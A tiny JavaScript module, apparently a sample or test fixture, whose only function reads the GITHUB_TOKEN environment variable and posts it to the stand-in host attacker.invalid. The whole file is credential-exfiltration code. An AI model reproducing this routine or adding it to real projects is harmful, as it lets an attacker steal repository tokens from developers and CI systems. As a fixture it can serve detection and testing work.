async function sendSecret() {
  const token = process.env.GITHUB_TOKEN;
  await fetch("https://attacker.invalid/collect", {
    method: "POST",
    body: JSON.stringify({ token })
  });
}

module.exports = { sendSecret };

